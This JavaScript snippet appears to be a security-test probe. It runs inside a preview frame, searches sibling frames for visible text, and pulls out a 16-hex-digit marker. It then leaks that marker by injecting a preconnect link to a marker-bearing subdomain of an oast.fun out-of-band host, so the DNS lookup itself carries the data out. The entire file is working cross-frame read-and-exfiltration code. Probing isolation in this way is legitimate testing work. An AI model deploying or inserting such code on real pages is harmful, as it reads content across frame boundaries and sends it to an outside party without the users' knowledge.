(() => {
  const output = document.getElementById('cg266-owned-script-status');
  if (!output) return;

  const started = Date.now();
  const maximumMs = 30000;
  const intervalMs = 250;
  const markerPattern = /(?:^|[^0-9a-f])([0-9a-f]{16})(?=$|[^0-9a-f])/g;
  let finished = false;
  let timer;

  function containsSelf(win, seen) {
    if (win === window) return true;
    if (seen.has(win)) return false;
    seen.add(win);
    try {
      for (let i = 0; i < win.frames.length; i++) {
        if (containsSelf(win.frames[i], seen)) return true;
      }
    } catch (_) {
      // Cross-origin frames may hide their descendants.
    }
    return false;
  }

  function firstVisibleMarker(win, seen) {
    if (win === window || seen.has(win)) return null;
    seen.add(win);
    try {
      const doc = win.document;
      if (doc !== document) {
        const visible = doc.body && doc.body.innerText;
        if (typeof visible === 'string') {
          markerPattern.lastIndex = 0;
          const match = markerPattern.exec(visible);
          if (match) return match[1];
        }
      }
    } catch (_) {
      // Skip documents that are not same-origin with this preview.
    }
    try {
      for (let i = 0; i < win.frames.length; i++) {
        const marker = firstVisibleMarker(win.frames[i], seen);
        if (marker) return marker;
      }
    } catch (_) {
      // Continue with other accessible siblings.
    }
    return null;
  }

  function findLaterVisibleMarker() {
    let ownIndex = -1;
    try {
      for (let i = 0; i < top.frames.length; i++) {
        if (containsSelf(top.frames[i], new Set())) {
          ownIndex = i;
          break;
        }
      }
      if (ownIndex < 0) return null;
      for (let i = ownIndex + 1; i < top.frames.length; i++) {
        const marker = firstVisibleMarker(top.frames[i], new Set());
        if (marker) return marker;
      }
    } catch (_) {
      // The host frame is not an authorized read target.
    }
    return null;
  }

  function check() {
    if (finished) return;
    const marker = findLaterVisibleMarker();
    if (marker) {
      finished = true;
      clearInterval(timer);
      output.textContent = `VISIBLE_TEXT_MARKER_FOUND:${marker}`;
      const hint = document.createElement('link');
      hint.rel = 'preconnect';
      hint.href = `https://cg271-${marker}.topwralyyfzhdmfckdhvbjshr74jjfmyr.oast.fun/`;
      document.head.append(hint);
      const status = document.createElement('pre');
      status.id = 'cg271-visible-status';
      status.textContent = `HINT_INSERTED:${marker}`;
      document.body.append(status);
    } else if (Date.now() - started >= maximumMs) {
      finished = true;
      clearInterval(timer);
      output.textContent = 'NO_LATER_VISIBLE_MARKER';
    }
  }

  timer = setInterval(check, intervalMs);
  check();
})();
